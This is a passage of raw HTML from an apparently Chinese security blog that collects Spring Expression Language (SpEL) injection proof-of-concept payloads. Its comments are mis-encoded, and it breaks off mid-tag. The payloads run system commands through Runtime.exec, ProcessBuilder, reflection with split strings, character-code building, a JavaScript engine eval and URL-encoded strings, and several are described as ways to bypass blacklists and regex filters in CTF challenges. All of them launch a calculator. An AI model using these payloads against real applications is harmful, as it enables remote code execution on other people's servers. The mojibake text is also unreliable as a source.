punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//request.getMethod()ä¸ºGET</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//Cookie</span>#request<span class="token punctuation">.</span><span class="token function">getRequestedSessionId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åå°„-å­—ç¬¦ä¸²æ‹¼è´´"><a href="#åå°„-å­—ç¬¦ä¸²æ‹¼è´´" class="headerlink" title="åå°„+å­—ç¬¦ä¸²æ‹¼è´´"></a>åå°„+å­—ç¬¦ä¸²æ‹¼è´´</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>newString<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>banäº†getSuperClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="éƒ¨åˆ†pocæ•´ç†"><a href="#éƒ¨åˆ†pocæ•´ç†" class="headerlink" title="éƒ¨åˆ†pocæ•´ç†"></a>éƒ¨åˆ†pocæ•´ç†</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// PoCåŸå‹</span><span class="token comment">// Runtime</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// ProcessBuilder</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token comment">// BypassæŠ€å·§</span><span class="token comment">// åå°„è°ƒç”¨</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// åå°„è°ƒç”¨+å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å¦‚javaconé¢˜ç›®ä¸­çš„æ­£åˆ™è¿‡æ»¤</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart1</span><span class="token comment">// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart2</span><span class="token comment">// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// JavaScriptå¼•æ“é€šç”¨PoC</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"nashorn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"</span><span class="token operator">+</span><span class="token string">"ng.Run"</span><span class="token operator">+</span><span class="token string">"time.getRu"</span><span class="token operator">+</span><span class="token string">"ntime().ex"</span><span class="token operator">+</span><span class="token string">"ec(s);"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScriptå¼•æ“+åå°„è°ƒç”¨</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScriptå¼•æ“+URLç¼–ç </span><span class="token comment">// å…¶ä¸­URLç¼–ç å†…å®¹ä¸ºï¼š</span><span class="token comment">// ä¸åŠ æœ€åçš„getInputStream()ä¹Ÿè¡Œï¼Œå› ä¸ºå¼¹è®¡ç®—å™¨ä¸éœ€è¦å›æ˜¾</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLDecoder</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// é»‘åå•è¿‡æ»¤".getClass("ï¼Œå¯åˆ©ç”¨æ•°ç»„çš„æ–¹å¼ç»•è¿‡ï¼Œè¿˜æœªæµ‹è¯•æˆåŠŸ</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span 